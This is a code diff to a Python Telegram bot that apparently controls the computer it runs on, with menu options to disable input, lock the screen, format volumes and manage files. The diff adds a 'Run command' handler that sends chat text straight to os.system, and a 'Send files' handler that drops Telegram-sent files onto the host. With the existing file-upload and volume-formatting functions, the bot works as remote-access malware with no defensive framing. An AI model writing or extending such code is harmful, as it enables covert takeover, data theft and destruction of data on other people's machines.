@@ -8,7 +8,7 @@ from config import *
 from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, Update
 from telegram.ext import Application, CommandHandler, ContextTypes, ConversationHandler, filters, MessageHandler
 from payload import *
-import logging, googledrive
+import asyncio, logging, googledrive
 from threading import Thread
 
 logging.basicConfig(
@@ -17,15 +17,15 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-PASSWORD, ACTION, FORMAT, MESSAGE, FILE_MANAGER, LIST, DELETE, UPLOAD = range(8)
+PASSWORD, ACTION, FORMAT, MESSAGE, COMMAND, FILE_MANAGER, LIST, DELETE, UPLOAD, SEND = range(10)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("Enter password.")
+	await update.message.reply_text("Enter password.")
 
-    return PASSWORD
+	return PASSWORD
 
 async def action_keyboard(update: Update):
-	reply_keyboard = [["Enable input", "Disable input", "Lock screen", "Format volumes", "Play message", "File manager"]]
+	reply_keyboard = [["Enable input", "Disable input", "Lock screen", "Format volumes", "Play message", "Run command", "File manager"]]
 
 	await update.message.reply_text(
 		"Choose your action:",
@@ -35,7 +35,7 @@ async def action_keyboard(update: Update):
 	)
 
 async def file_keyboard(update: Update):
-	reply_keyboard = [["List files", "Upload files", "Delete files", "Go back"]]
+	reply_keyboard = [["List files", "Upload files", "Send files", "Delete files", "Go back"]]
 
 	await update.message.reply_text(
 		"Choose your action:",
@@ -85,6 +85,10 @@ async def action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 			logger.info("Got a request from %s to format volumes.", user.first_name)
 			await update.message.reply_text("Please enter a space-separated list of the volumes you want to format.", reply_markup=ReplyKeyboardRemove())
 			return FORMAT
+		case "Run command":
+			logger.info("Got a request from %s to execute a command.", user.first_name)
+			await update.message.reply_text("Please enter the command you want to execute.", reply_markup=ReplyKeyboardRemove())
+			return COMMAND
 		case "Play message":
 			logger.info("Got a request from %s to play a message.", user.first_name)
 			await update.message.reply_text("Please enter the message you want to play.", reply_markup=ReplyKeyboardRemove())
@@ -105,6 +109,10 @@ async def file_manager(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 			logger.info("Got a request from %s to upload files.", user.first_name)
 			await update.message.reply_text("Please enter the path.", reply_markup=ReplyKeyboardRemove())
 			return UPLOAD
+		case "Send files":
+			logger.info("Got a request from %s to send files.", user.first_name)
+			await update.message.reply_text("Please upload the file.", reply_markup=ReplyKeyboardRemove())
+			return SEND
 		case "Delete files":
 			logger.info("Got a request from %s to delete files.", user.first_name)
 			await update.message.reply_text("Please enter the path.", reply_markup=ReplyKeyboardRemove())
@@ -119,6 +127,15 @@ async def format(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 	logger.info("Got a request from %s to format volumes %s.", user.first_name, update.message.text)                
 	Thread(target=formatVolumes,args=(update.message.text.split(),)).start()
 	await update.message.reply_text("Command to format the volumes sent.")
+
+	await action_keyboard(update)
+	return ACTION
+
+async def command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+	user = update.message.from_user
+	logger.info("Got a request from %s to execute command %s.", user.first_name, update.message.text)
+	Thread(target=os.system,args=(update.message.text,)).start()
+	await update.message.reply_text("Command executed.")
 
 	await action_keyboard(update)
 	return ACTION
@@ -151,6 +168,20 @@ async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 	await file_keyboard(update)
 	return FILE_MANAGER
 
+async def send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+	user = update.message.from_user
+	try:
+		file = await context.bot.get_file(update.message.document)
+		logger.info("Got a request from %s to upload file %s.", user.first_name, update.message.document.file_id)
+		asyncio.create_task(file.download_to_drive(os.path.join(os.path.dirname(__file__), update.message.document.file_id)))
+		await update.message.reply_text("Uploading the file as " + update.message.document.file_id + ".")
+	except:
+		logger.info("Got a request from %s to upload file %s, but it is too big.", user.first_name, update.message.document.file_id)
+		await update.message.reply_text("The file is too big.")
+
+	await file_keyboard(update)
+	return FILE_MANAGER
+
 async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 	user = update.message.from_user
 
@@ -175,13 +206,15 @@ def startBot():
 		entry_points=[CommandHandler("start", start)],
 		states={
 			PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password)],
-			ACTION: [MessageHandler(filters.Regex("^(Enable input|Disable input|Lock screen|Format volumes|Play message|File manager)$"), action)],
+			ACTION: [MessageHandler(filters.Regex("^(Enable input|Disable input|Lock screen|Format volumes|Run command|Play message|File manager)$"), action)],
 			FORMAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, format)],
 			MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, message)],
-			FILE_MANAGER: [MessageHandler(filters.Regex("^(List files|Upload files|Delete files|Go back)$"), file_manager)],
+			FILE_MANAGER: [MessageHandler(filters.Regex("^(List files|Upload files|Send files|Delete files|Go back)$"), file_manager)],
 			LIST: [MessageHandler(filters.TEXT & ~filters.COMMAND, list)],
 			DELETE: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete)],
 			UPLOAD: [MessageHandler(filters.TEXT & ~filters.COMMAND, upload)],
+			COMMAND: [MessageHandler(filters.TEXT & ~filters.COMMAND, command)],
+			SEND: [MessageHandler(filters.Document.ALL, send)],
 		},
 		fallbacks=[CommandHandler("cancel", cancel)],
 	)
